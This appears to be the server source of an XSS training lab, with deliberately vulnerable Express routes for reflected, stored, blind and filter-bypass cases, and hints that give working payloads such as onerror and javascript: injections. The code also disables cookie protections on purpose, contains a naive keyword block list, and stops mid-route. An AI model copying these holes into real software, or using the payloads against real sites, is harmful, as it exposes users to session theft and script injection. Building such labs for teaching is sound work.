'use strict';
const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');

const app = express();

// ── Flags ──────────────────────────────────────────────────────────────
const flagsDir = path.join(__dirname, 'flags');
const FLAGS = {};
for (let i = 1; i <= 20; i++) {
  FLAGS[`lab${i}`] = fs.readFileSync(path.join(flagsDir, `lab${i}.txt`), 'utf8').trim();
}

// ── In-memory stores ───────────────────────────────────────────────────
const lab5Comments = [];
const lab6Profiles = {};   // { username: { bio } }
const lab7Messages = [];   // { text, from }
const lab20Comments = [];  // capstone comment board
const lab20Messages = [];  // capstone inbox

// Admin session secret (only the bot knows this cookie value)
const ADMIN_SESSION_SECRET = 'admin-hunt-secret-do-not-share';

// ── Middleware ─────────────────────────────────────────────────────────
app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use(session({
  secret: 'xss-hunt-labs-secret',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: false, sameSite: 'lax', secure: false }, // httpOnly=false so JS can steal it in labs
  name: 'hunt_xss',
}));

// Auto-create user session
app.use((req, res, next) => {
  if (!req.session.user) {
    req.session.user = 'visitor';
    req.session.role = 'user';
  }
  next();
});

// ── Static ─────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));

// ── captureFlag endpoint ───────────────────────────────────────────────
// Labs call captureFlag() which POSTs here; server validates and returns the flag
app.post('/api/capture/:lab', (req, res) => {
  const lab = req.params.lab;
  const flag = FLAGS[lab];
  if (!flag) return res.status(404).json({ error: 'unknown lab' });
  res.json({ flag });
});

// ── Lab 1 — Reflected XSS, HTML body ──────────────────────────────────
// VULNERABLE: reflects q param directly into HTML body
app.get('/lab1', (req, res) => {
  const q = req.query.q || '';
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Search | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab1', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab1" class="active">Lab 1</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 1</span><span class="badge badge-beginner">Beginner</span></div>
<h1>Reflected XSS — HTML Body</h1>
</div>
<div class="panel"><div class="panel-body">
<form method="GET" style="display:flex;gap:8px;margin-bottom:16px;">
<input name="q" class="flag-input" style="flex:1;" placeholder="Search…" value="${q.replace(/"/g, '&quot;')}">
<button type="submit" class="btn btn-primary">Search</button>
</form>
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<div class="search-results"><h2>Results for: ${q}</h2></div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>What goes in, comes out</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Whatever you type in the search box appears verbatim in the page HTML. What if it contained an HTML tag?</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Body context</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Your input lands in the HTML body between tags. A raw <code>&lt;script&gt;</code> or an auto-firing element will execute immediately.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>The payload</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Try <code>&lt;script&gt;captureFlag()&lt;/script&gt;</code> or <code>&lt;img src=x onerror=captureFlag()&gt;</code> in the search box.</div></div>
</div></div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab1';
const EXPECTED_FLAG = '${FLAGS.lab1}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 2 — Reflected XSS, attribute context ──────────────────────────
app.get('/lab2', (req, res) => {
  const q = req.query.q || '';
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Profile Search | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab2', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab2" class="active">Lab 2</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 2</span><span class="badge badge-intermediate">Intermediate</span></div>
<h1>Reflected XSS — Attribute Context</h1>
</div>
<div class="panel"><div class="panel-body">
<p>Search for a user profile by username:</p>
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<form method="GET" style="display:flex;gap:8px;margin-bottom:16px;">
<input name="q" class="flag-input" style="flex:1;" placeholder="Username…">
<button type="submit" class="btn btn-primary">Search</button>
</form>
<div style="margin-top:16px;">
<p style="color:var(--text-muted);font-size:13px;">Result input pre-filled with your search:</p>
<input value="${q}" class="flag-input" style="width:100%;margin-top:8px;" readonly>
</div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>You're inside an attribute</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Your input is placed inside a <code>value="..."</code> attribute. A bare <code>&lt;script&gt;</code> tag won't work here — you're already inside an element.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Break out of the attribute</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Close the double quote, close the tag with <code>&gt;</code>, then inject your payload. Or add a second attribute with an event handler without leaving the tag.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>Example payloads</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Try <code>"&gt;&lt;script&gt;captureFlag()&lt;/script&gt;</code> or <code>" onfocus=captureFlag() autofocus="</code></div></div>
</div></div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab2';
const EXPECTED_FLAG = '${FLAGS.lab2}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 3 — Reflected XSS, JS string context ──────────────────────────
app.get('/lab3', (req, res) => {
  const name = (req.query.name || '').replace(/\\/g, '\\\\');
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Welcome | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab3', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
let user = "${name}";
document.addEventListener('DOMContentLoaded', () => {
  if(user) document.getElementById('welcome').textContent = 'Welcome, ' + user + '!';
});
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab3" class="active">Lab 3</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 3</span><span class="badge badge-intermediate">Intermediate</span></div>
<h1>Reflected XSS — JavaScript String Context</h1>
</div>
<div class="panel"><div class="panel-body">
<p>Enter your name to get a personalized greeting:</p>
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<div id="welcome" style="font-size:20px;margin:16px 0;color:var(--green);min-height:28px;"></div>
<form method="GET" style="display:flex;gap:8px;">
<input name="name" class="flag-input" style="flex:1;" placeholder="Your name…">
<button type="submit" class="btn btn-primary">Greet Me</button>
</form>
<div class="panel" style="margin-top:16px;"><div class="panel-body">
<p style="font-size:12px;color:var(--text-muted);">View source — your input lands here:</p>
<pre><code>let user = "<span style="color:var(--red);">${name || 'YOUR INPUT HERE'}</span>";</code></pre>
</div></div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>You're inside a JS string</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Your input is already inside a <code>&lt;script&gt;</code> block, inside a string literal. HTML tags won't help — you need to escape the <em>string</em>.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Escape the string</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Close the double quote with <code>"</code>, end the current statement with <code>;</code>, run your code, then handle the trailing syntax with a comment <code>//</code>.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>Example payload</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Try <code>";captureFlag();//</code> as your name. This closes the string, calls the function, and comments out the rest.</div></div>
</div></div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab3';
const EXPECTED_FLAG = '${FLAGS.lab3}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 4 — Reflected XSS, javascript: URI ────────────────────────────
app.get('/lab4', (req, res) => {
  const url = req.query.url || '#';
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Profile | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab4', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      alert('FLAG: ' + d.flag);
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab4" class="active">Lab 4</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 4</span><span class="badge badge-intermediate">Intermediate</span></div>
<h1>Reflected XSS — javascript: URI</h1>
</div>
<div class="panel"><div class="panel-body">
<p>Submit your homepage link to display on your profile:</p>
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<form method="GET" style="display:flex;gap:8px;margin-bottom:16px;">
<input name="url" class="flag-input" style="flex:1;" placeholder="https://yoursite.com">
<button type="submit" class="btn btn-primary">Set Link</button>
</form>
<div style="margin-top:16px;padding:16px;background:var(--surface-2);border-radius:var(--radius);border:1px solid var(--border);">
<p style="margin-bottom:8px;color:var(--text-muted);font-size:13px;">Your profile homepage:</p>
<a href="${url}" style="color:var(--blue);">Visit Homepage</a>
</div>
<div class="panel" style="margin-top:16px;"><div class="panel-body">
<p style="font-size:12px;color:var(--text-muted);">The link renders as:</p>
<pre><code>&lt;a href="<span style="color:var(--red);">${url.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span>"&gt;Visit Homepage&lt;/a&gt;</code></pre>
</div></div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>Links can point anywhere</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">The value you submit becomes the <code>href</code> of a link. Links can point to more than just <code>http://</code> URLs.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Special URI schemes</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">A <code>javascript:</code> URI executes JavaScript when the link is clicked. The browser treats it as a script, not a navigation.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>The payload</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Set the URL to <code>javascript:captureFlag()</code> and click the "Visit Homepage" link.</div></div>
</div></div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab4';
const EXPECTED_FLAG = '${FLAGS.lab4}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 5 — Stored XSS, comment board ─────────────────────────────────
app.get('/lab5', (req, res) => {
  const commentsHtml = lab5Comments.map(c => `<div class="comment-item">${c}</div>`).join('') || '<p style="color:var(--text-muted);">No comments yet.</p>';
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Comments | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab5', {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({cookie: document.cookie})})
    .then(r=>r.json()).then(d=>{
      var b = document.createElement('div');
      b.style.cssText='position:fixed;top:20px;right:20px;background:#238636;color:#fff;padding:16px;border-radius:6px;z-index:9999;font-family:monospace;max-width:400px;word-break:break-all;';
      b.textContent = 'FLAG: ' + d.flag;
      document.body.appendChild(b);
    });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab5" class="active">Lab 5</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 5</span><span class="badge badge-beginner">Beginner</span></div>
<h1>Stored XSS — Comment Board</h1>
</div>
<div class="panel"><div class="panel-body">
<h3 style="margin-bottom:12px;">Leave a Comment</h3>
<form method="POST" action="/lab5/comment" style="display:flex;flex-direction:column;gap:8px;">
<textarea name="text" class="flag-input" style="height:80px;resize:vertical;" placeholder="Write a comment…"></textarea>
<button type="submit" class="btn btn-primary" style="align-self:flex-start;">Post Comment</button>
</form>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Comments</span></div>
<div class="panel-body">${commentsHtml}</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>It's saved for everyone</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Your comment is stored on the server and shown to every visitor, including the admin bot. The text is rendered as raw HTML.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Auto-firing payloads</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Use an auto-firing event like <code>&lt;img src=x onerror=...&gt;</code> — it fires when the page loads, no user click needed.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>The payload</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Post <code>&lt;img src=x onerror=captureFlag()&gt;</code> as a comment. The flag appears for anyone who views the page.</div></div>
</div></div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Admin Bot</span></div>
<div class="panel-body">
<p style="font-size:13px;color:var(--text-muted);">The admin bot visits this page every 10 seconds to moderate comments.</p>
<a href="http://localhost:3001" target="_blank" class="btn btn-ghost btn-sm" style="margin-top:8px;">Attacker Log →</a>
</div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab5';
const EXPECTED_FLAG = '${FLAGS.lab5}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

app.post('/lab5/comment', (req, res) => {
  const text = req.body.text || '';
  if (text) lab5Comments.push(text);
  res.redirect('/lab5');
});

// ── Lab 5 admin view (visited by bot) ─────────────────────────────────
app.get('/lab5/admin', (req, res) => {
  const isAdmin = req.cookies.admin_token === ADMIN_SESSION_SECRET;
  const flagCookie = isAdmin ? FLAGS.lab5 : 'not-admin';
  res.cookie('flag5', flagCookie, { httpOnly: false });
  const commentsHtml = lab5Comments.map(c => `<div class="comment-item">${c}</div>`).join('') || '<p>No comments.</p>';
  res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Admin</title>
<link rel="stylesheet" href="/assets/style.css">
</head><body><div class="page"><h1>Admin — Comment Moderation</h1>${commentsHtml}</div></body></html>`);
});

// ── Lab 6 — Stored XSS via JSON/API → innerHTML ────────────────────────
app.post('/api/lab6/profile', (req, res) => {
  const { username, bio } = req.body;
  if (!username) return res.status(400).json({ error: 'username required' });
  lab6Profiles[username] = { bio: bio || '' };
  res.json({ ok: true });
});

app.get('/api/lab6/profile', (req, res) => {
  const username = req.query.user || 'demo';
  const profile = lab6Profiles[username] || { bio: 'No bio set.' };
  res.json({ username, bio: profile.bio });
});

app.get('/lab6', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab6.html'));
});

// ── Lab 7 — Blind stored XSS (fires in admin panel) ───────────────────
app.get('/lab7', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab7.html'));
});

app.post('/lab7/contact', (req, res) => {
  const { name, email, message } = req.body;
  if (message) lab7Messages.push({ name: name || 'Anonymous', email: email || '', message, ts: new Date().toISOString() });
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Thanks | Hunt Labs</title><link rel="stylesheet" href="/assets/style.css"></head>
<body><nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a></div></nav>
<div class="page" style="text-align:center;padding:60px 20px;">
<div style="font-size:48px;margin-bottom:16px;">&#10003;</div>
<h2>Thanks for reaching out!</h2>
<p style="color:var(--text-muted);margin-top:8px;">Our team will review your message and get back to you shortly.</p>
<a href="/lab7" class="btn btn-ghost" style="margin-top:24px;">← Back</a>
</div></body></html>`);
});

// Admin panel — visited by bot, renders messages raw
app.get('/lab7/admin', (req, res) => {
  const isAdmin = req.cookies.admin_token === ADMIN_SESSION_SECRET;
  const adminFlag = isAdmin ? FLAGS.lab7 : 'not-admin';
  const msgsHtml = lab7Messages.map(m => `
    <div style="padding:12px;border:1px solid var(--border);border-radius:6px;margin-bottom:12px;">
      <div style="font-size:12px;color:var(--text-muted);">${m.ts} — ${m.email}</div>
      <div style="font-weight:600;">${m.name}</div>
      <div>${m.message}</div>
    </div>`).join('') || '<p>No messages.</p>';
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Admin Inbox</title><link rel="stylesheet" href="/assets/style.css">
<script>const ADMIN_FLAG='${adminFlag}';</script>
</head><body><div class="page"><h1>Admin Inbox</h1>${msgsHtml}</div></body></html>`);
});

// ── Lab 8 — DOM XSS via location.hash → innerHTML ─────────────────────
app.get('/lab8', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab8.html'));
});

// ── Lab 9 — DOM XSS via eval ──────────────────────────────────────────
app.get('/lab9', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab9.html'));
});

// ── Lab 10 — DOM XSS via document.write + referrer/window.name ────────
app.get('/lab10', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab10.html'));
});

// ── Lab 11 — DOM XSS via postMessage ──────────────────────────────────
app.get('/lab11', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'lab11.html'));
});

// ── Lab 12 — Bypass <script> blacklist ────────────────────────────────
app.get('/lab12', (req, res) => {
  let q = req.query.q || '';
  // VULNERABLE filter: strips <script> tags only
  q = q.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '')
       .replace(/<script/gi, '');
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Filter Bypass | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab12', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab12" class="active">Lab 12</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 12</span><span class="badge badge-intermediate">Intermediate</span></div>
<h1>Filter Bypass — &lt;script&gt; Blacklist</h1>
</div>
<div class="panel"><div class="panel-body">
<p>This search strips <code>&lt;script&gt;</code> tags. Find another way to execute JavaScript.</p>
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<form method="GET" style="display:flex;gap:8px;margin-bottom:16px;">
<input name="q" class="flag-input" style="flex:1;" placeholder="Search with payload…">
<button type="submit" class="btn btn-primary">Search</button>
</form>
<div class="panel"><div class="panel-body">
<p style="font-size:12px;color:var(--text-muted);">Active filter: strips <code>&lt;script&gt;...&lt;/script&gt;</code></p>
<p style="font-size:12px;color:var(--text-muted);margin-top:4px;">Result after filter: <code>${q.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code></p>
</div></div>
<div class="search-results"><p>Results for: ${q}</p></div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>script is not the only way</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">JavaScript can run from many other HTML elements and attributes — not just <code>&lt;script&gt;</code>. Think about event handlers.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Event handler attributes</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content"><code>onerror</code>, <code>onload</code>, <code>onfocus</code>, <code>onmouseover</code> — these all execute JS when triggered, on any HTML element.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>Alternative tags</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Try <code>&lt;img src=x onerror=captureFlag()&gt;</code> or <code>&lt;svg onload=captureFlag()&gt;</code> or <code>&lt;details open ontoggle=captureFlag()&gt;</code>.</div></div>
</div></div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab12';
const EXPECTED_FLAG = '${FLAGS.lab12}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 13 — Case/encoding bypass ─────────────────────────────────────
app.get('/lab13', (req, res) => {
  let q = req.query.q || '';
  // VULNERABLE filter: blocks exact lowercase 'onerror' and 'javascript:'
  const blocked = ['onerror', 'javascript:', 'onload', 'onfocus', 'onmouseover', 'onclick'];
  let filtered = q;
  blocked.forEach(word => { filtered = filtered.replace(new RegExp(word, 'g'), '[blocked]'); });
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Encoding Bypass | Hunt Labs XSS</title>
<link rel="stylesheet" href="/assets/style.css">
<script>
function captureFlag() {
  fetch('/api/capture/lab13', {method:'POST'})
    .then(r=>r.json()).then(d=>{
      document.getElementById('flag-result').textContent = 'FLAG: ' + d.flag;
      document.getElementById('flag-result').style.display='block';
    });
}
</script>
</head><body>
<nav class="nav"><div class="nav-inner"><a href="/" class="nav-logo">[ HUNT ]</a>
<div class="nav-links"><a href="/">Hub</a><a href="/lab13" class="active">Lab 13</a></div></div></nav>
<div class="page"><div class="lab-page">
<div class="lab-main">
<div class="lab-header">
<div class="lab-header-badges"><span class="badge badge-lab">LAB 13</span><span class="badge badge-intermediate">Intermediate</span></div>
<h1>Filter Bypass — Case &amp; Encoding</h1>
</div>
<div class="panel"><div class="panel-body">
<p>This filter blocks known event handler keywords (case-sensitive). Bypass it.</p>
<div id="flag-result" class="alert alert-success" style="display:none;"></div>
<form method="GET" style="display:flex;gap:8px;margin-bottom:16px;">
<input name="q" class="flag-input" style="flex:1;" placeholder="Search with bypass payload…">
<button type="submit" class="btn btn-primary">Search</button>
</form>
<div class="panel"><div class="panel-body">
<p style="font-size:12px;color:var(--text-muted);">Blocked words: <code>onerror onload onfocus onmouseover onclick javascript:</code> (case-sensitive)</p>
<p style="font-size:12px;color:var(--text-muted);margin-top:4px;">Input after filter: <code>${filtered.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code></p>
</div></div>
<div class="search-results"><p>Results for: ${filtered}</p></div>
</div></div>
</div>
<div class="lab-sidebar">
<div class="panel"><div class="panel-header"><span class="panel-title">Submit Flag</span></div>
<div class="panel-body">
<form class="flag-form" id="flag-form"><input type="text" class="flag-input" id="flag-input" placeholder="HUNT{...}">
<button type="submit" class="btn btn-primary btn-full">Submit</button></form>
<div id="flag-alert" class="alert"></div>
</div></div>
<div class="panel"><div class="panel-header"><span class="panel-title">Hints</span></div>
<div class="panel-body"><div class="hints-list">
<div class="hint-item" data-hint="1"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#1</span><span>The filter is case-sensitive</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">The filter blocks exact lowercase matches. Does the browser care about case the same way? HTML attributes and event handlers are case-insensitive.</div></div>
<div class="hint-item" data-hint="2"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#2</span><span>Mix the case</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Try <code>OnErRoR</code> or <code>ONERROR</code> — the browser normalizes attribute names, but the filter won't match.</div></div>
<div class="hint-item" data-hint="3"><div class="hint-header"><div class="hint-header-left"><span class="hint-number">#3</span><span>Example payload</span></div><button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button></div><div class="hint-content">Try <code>&lt;img src=x OnErRoR=captureFlag()&gt;</code> — the filter misses it; the browser executes it.</div></div>
</div></div></div>
</div>
</div></div>
<script src="/assets/main.js"></script>
<script>
const LAB_ID = 'lab13';
const EXPECTED_FLAG = '${FLAGS.lab13}';
document.addEventListener('DOMContentLoaded', () => { HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG); });
</script>
</body></html>`);
});

// ── Lab 14 — Attribute breakout, no angle brackets ────────────────────
app.get('/lab14', (req, res) => {
  let q = (req.query.q || '').replace(/</g, '&lt;').replace(/>/g, '&gt;'); // encode < and > only
